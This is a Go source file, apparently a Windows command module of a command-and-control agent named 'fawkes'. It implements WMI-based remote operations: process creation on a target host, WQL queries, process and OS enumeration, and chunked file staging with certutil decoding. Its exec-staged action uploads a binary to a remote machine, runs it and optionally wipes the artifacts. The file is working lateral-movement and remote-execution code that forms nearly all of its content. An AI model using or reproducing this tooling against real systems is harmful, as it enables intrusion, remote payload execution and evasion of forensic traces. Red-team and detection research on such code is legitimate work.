//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"time"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type WmiCommand struct{}

func (c *WmiCommand) Name() string {
	return "wmi"
}

func (c *WmiCommand) Description() string {
	return "Execute WMI queries and commands via COM API"
}

type wmiArgs struct {
	Action     string `json:"action"`
	Target     string `json:"target"`
	Command    string `json:"command"`
	Query      string `json:"query"`
	Timeout    int    `json:"timeout"`
	LocalPath  string `json:"local_path"`
	RemotePath string `json:"remote_path"`
	Method     string `json:"method"`
	Cleanup    bool   `json:"cleanup"`
}

func (c *WmiCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[wmiArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Timeout <= 0 {
		args.Timeout = 120
	}
	timeout := time.Duration(args.Timeout) * time.Second

	var fn func() structs.CommandResult
	switch strings.ToLower(args.Action) {
	case "execute":
		fn = func() structs.CommandResult { return wmiExecute(args.Target, args.Command) }
	case "query":
		fn = func() structs.CommandResult { return wmiQuery(args.Target, args.Query) }
	case "process-list":
		fn = func() structs.CommandResult { return wmiProcessList(args.Target) }
	case "os-info":
		fn = func() structs.CommandResult { return wmiOsInfo(args.Target) }
	case "upload":
		fn = func() structs.CommandResult { return wmiUpload(args) }
	case "exec-staged":
		fn = func() structs.CommandResult { return wmiExecStaged(args) }
	default:
		return errorf("Unknown action: %s\nAvailable: execute, query, process-list, os-info, upload, exec-staged", args.Action)
	}

	// Run with timeout protection to prevent agent hangs on unreachable targets
	ch := make(chan structs.CommandResult, 1)
	go func() {
		ch <- fn()
	}()
	select {
	case r := <-ch:
		return r
	case <-time.After(timeout):
		host := args.Target
		if host == "" {
			host = "localhost"
		}
		return errorf("WMI operation timed out after %ds — target %s may be unreachable", args.Timeout, host)
	}
}

// wmiConnection holds a WMI COM connection (SWbemLocator + SWbemServices).
type wmiConnection struct {
	locator  *ole.IDispatch
	services *ole.IDispatch
}

// wmiConnect initializes COM and connects to WMI on the given target.
// Caller must call cleanup() when done.
func wmiConnect(target string) (*wmiConnection, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		// S_FALSE means already initialized on this thread — not an error
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, fmt.Errorf("CoInitializeEx failed: %w", err)
		}
	}

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to create WbemScripting.SWbemLocator: %w", err)
	}

	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("failed to query IDispatch on SWbemLocator: %w", err)
	}

	// ConnectServer args: server, namespace, user, password, locale, authority, securityFlags, namedValueSet
	server := ""
	if target != "" {
		server = `\\` + target
	}

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", server, `root\CIMV2`)
	if err != nil {
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, fmt.Errorf("ConnectServer failed: %w", err)
	}
	services := serviceResult.ToIDispatch()

	conn := &wmiConnection{
		locator:  locator,
		services: services,
	}

	cleanup := func() {
		services.Release()
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return conn, cleanup, nil
}

// wmiExecQuery runs a WQL query and returns results as formatted text.
func wmiExecQuery(conn *wmiConnection, wql string) (string, error) {
	resultSet, err := oleutil.CallMethod(conn.services, "ExecQuery", wql)
	if err != nil {
		return "", fmt.Errorf("ExecQuery failed: %w", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()

	var sb strings.Builder
	itemCount := 0

	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		// Note: do NOT Release item — ForEach manages the VARIANT lifecycle

		if itemCount > 0 {
			sb.WriteString("\n---\n")
		}
		itemCount++

		// Get properties collection
		propsResult, err := oleutil.GetProperty(item, "Properties_")
		if err != nil {
			return fmt.Errorf("failed to get Properties_: %w", err)
		}
		defer propsResult.Clear()

		propsDisp := propsResult.ToIDispatch()

		// Iterate properties
		err = oleutil.ForEach(propsDisp, func(pv *ole.VARIANT) error {
			prop := pv.ToIDispatch()
			// Note: do NOT Release prop — ForEach manages the VARIANT lifecycle

			nameResult, err := oleutil.GetProperty(prop, "Name")
			if err != nil {
				return nil // skip properties we can't read
			}
			defer nameResult.Clear()

			valResult, err := oleutil.GetProperty(prop, "Value")
			if err != nil {
				sb.WriteString(fmt.Sprintf("%s=\n", nameResult.ToString()))
				return nil
			}
			defer valResult.Clear()

			name := nameResult.ToString()
			val := variantToString(valResult)
			if val != "" {
				sb.WriteString(fmt.Sprintf("%s=%s\n", name, val))
			}
			return nil
		})
		if err != nil {
			return fmt.Errorf("iterating WMI properties: %w", err)
		}
		return nil
	})

	if err != nil {
		return sb.String(), err
	}

	if itemCount == 0 {
		return "(no results)", nil
	}

	return sb.String(), nil
}

// variantToString converts a VARIANT to a readable string.
func variantToString(v *ole.VARIANT) string {
	if v == nil {
		return ""
	}
	switch v.VT {
	case ole.VT_NULL, ole.VT_EMPTY:
		return ""
	case ole.VT_BSTR:
		return v.ToString()
	default:
		val := v.Value()
		if val == nil {
			return ""
		}
		return fmt.Sprintf("%v", val)
	}
}

// wmiExecute creates a process on the target via WMI Win32_Process.Create
func wmiExecute(target, command string) structs.CommandResult {
	if command == "" {
		return errorResult("Error: command parameter is required for execute action")
	}

	conn, cleanup, err := wmiConnect(target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	// Get the Win32_Process class
	classResult, err := oleutil.CallMethod(conn.services, "Get", "Win32_Process")
	if err != nil {
		return errorf("Error getting Win32_Process class: %v", err)
	}
	defer classResult.Clear()
	classDisp := classResult.ToIDispatch()

	// Call Win32_Process.Create(CommandLine)
	// Parameters: CommandLine, CurrentDirectory, ProcessStartupInformation, ProcessId
	createResult, err := oleutil.CallMethod(classDisp, "Create", command, nil, nil)
	if err != nil {
		return errorf("Error calling Win32_Process.Create: %v", err)
	}
	defer createResult.Clear()

	// The Create method returns an SWbemObject with ReturnValue and ProcessId via out params
	// However, the SWbem dispatch model returns ReturnValue directly
	retVal := createResult.Value()

	host := "localhost"
	if target != "" {
		host = target
	}

	return successf("WMI Process Create on %s:\n  Command: %s\n  Return Value: %v\n  (0 = Success, 2 = Access Denied, 3 = Insufficient Privilege, 8 = Unknown Failure, 21 = Invalid Parameter)", host, command, retVal)
}

// wmiQuery runs an arbitrary WQL query
func wmiQuery(target, query string) structs.CommandResult {
	if query == "" {
		return errorResult("Error: query parameter is required for query action")
	}

	conn, cleanup, err := wmiConnect(target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	result, err := wmiExecQuery(conn, query)
	if err != nil {
		return errorf("Error running WMI query: %v\n%s", err, result)
	}

	return successf("WMI Query Result:\n%s", result)
}

// wmiProcessList lists processes on the target
func wmiProcessList(target string) structs.CommandResult {
	conn, cleanup, err := wmiConnect(target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	result, err := wmiExecQuery(conn, "SELECT Name, ProcessId, HandleCount, WorkingSetSize FROM Win32_Process")
	if err != nil {
		return errorf("Error listing processes: %v\n%s", err, result)
	}

	return successf("WMI Process List:\n%s", result)
}

// wmiOsInfo gets OS information from the target
func wmiOsInfo(target string) structs.CommandResult {
	conn, cleanup, err := wmiConnect(target)
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	result, err := wmiExecQuery(conn, "SELECT Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime, TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem")
	if err != nil {
		return errorf("Error getting OS info: %v\n%s", err, result)
	}

	return successf("WMI OS Info:\n%s", result)
}

// wmiUpload stages a local file on the remote host via WMI command execution.
func wmiUpload(args wmiArgs) structs.CommandResult {
	if args.LocalPath == "" {
		return errorResult("Error: local_path is required (file to upload from agent filesystem)")
	}
	if args.Target == "" {
		return errorResult("Error: target is required (remote host)")
	}

	method := parseStagingMethod(args.Method)
	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
	if err != nil {
		return errorf("Error planning staging: %v", err)
	}

	host := args.Target
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Staging file to %s via WMI:\n", host))
	sb.WriteString(fmt.Sprintf("  Source:      %s\n", args.LocalPath))
	sb.WriteString(fmt.Sprintf("  Destination: %s\n", plan.RemotePath))
	sb.WriteString(fmt.Sprintf("  Method:      %s\n", args.Method))
	sb.WriteString(fmt.Sprintf("  Commands:    %d write + %d decode\n\n", len(plan.WriteCommands), boolToInt(plan.DecodeCommand != "")))

	// Execute write commands
	for i, cmd := range plan.WriteCommands {
		result := wmiExecute(host, cmd)
		if !(result.Status == "success") {
			return errorf("Error on write chunk %d/%d: %s", i+1, len(plan.WriteCommands), result.Output)
		}
		sb.WriteString(fmt.Sprintf("  [%d/%d] Write chunk OK\n", i+1, len(plan.WriteCommands)))
	}

	// Execute decode command (certutil method)
	if plan.DecodeCommand != "" {
		result := wmiExecute(host, plan.DecodeCommand)
		if !(result.Status == "success") {
			return errorf("Error decoding staged file: %s", result.Output)
		}
		sb.WriteString("  Decode OK\n")
	}

	sb.WriteString(fmt.Sprintf("\nFile staged at: %s\n", plan.RemotePath))
	sb.WriteString("Use exec-staged to execute, or cleanup manually.")

	return successResult(sb.String())
}

// wmiExecStaged uploads a file to the remote host, executes it, and optionally cleans up.
func wmiExecStaged(args wmiArgs) structs.CommandResult {
	if args.LocalPath == "" {
		return errorResult("Error: local_path is required (file to stage and execute)")
	}
	if args.Target == "" {
		return errorResult("Error: target is required (remote host)")
	}

	method := parseStagingMethod(args.Method)
	plan, err := planStaging(args.LocalPath, args.RemotePath, method)
	if err != nil {
		return errorf("Error planning staging: %v", err)
	}

	host := args.Target
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Staged execution on %s via WMI:\n", host))
	sb.WriteString(fmt.Sprintf("  Source:  %s\n", args.LocalPath))
	sb.WriteString(fmt.Sprintf("  Remote:  %s\n", plan.RemotePath))
	sb.WriteString(fmt.Sprintf("  Method:  %s\n\n", args.Method))

	// Phase 1: Stage the file
	sb.WriteString("--- Phase 1: Staging ---\n")
	for i, cmd := range plan.WriteCommands {
		result := wmiExecute(host, cmd)
		if !(result.Status == "success") {
			return errorf("Staging failed on chunk %d/%d: %s", i+1, len(plan.WriteCommands), result.Output)
		}
		sb.WriteString(fmt.Sprintf("  [%d/%d] Write OK\n", i+1, len(plan.WriteCommands)))
	}

	if plan.DecodeCommand != "" {
		result := wmiExecute(host, plan.DecodeCommand)
		if !(result.Status == "success") {
			// Clean up partial staging
			for _, cmd := range plan.CleanupCommands {
				wmiExecute(host, cmd)
			}
			return errorf("Decode failed: %s", result.Output)
		}
		sb.WriteString("  Decode OK\n")
		// Delete the intermediate base64 file
		b64Cleanup := fmt.Sprintf(`cmd.exe /c del /f /q "%s.b64"`, plan.RemotePath)
		wmiExecute(host, b64Cleanup)
	}

	// Phase 2: Execute
	sb.WriteString("\n--- Phase 2: Execution ---\n")
	execCmd := plan.RemotePath
	if args.Command != "" {
		// Allow appending arguments to the staged binary
		execCmd = fmt.Sprintf(`%s %s`, plan.RemotePath, args.Command)
	}
	execResult := wmiExecute(host, execCmd)
	sb.WriteString(fmt.Sprintf("  Execute: %s\n", execResult.Output))

	// Phase 3: Cleanup
	if args.Cleanup {
		sb.WriteString("\n--- Phase 3: Cleanup ---\n")
		for _, cmd := range plan.CleanupCommands {
			wmiExecute(host, cmd)
		}
		sb.WriteString("  Artifacts removed\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  Note: File remains at %s (use cleanup=true to auto-remove)\n", plan.RemotePath))
	}

	return successResult(sb.String())
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
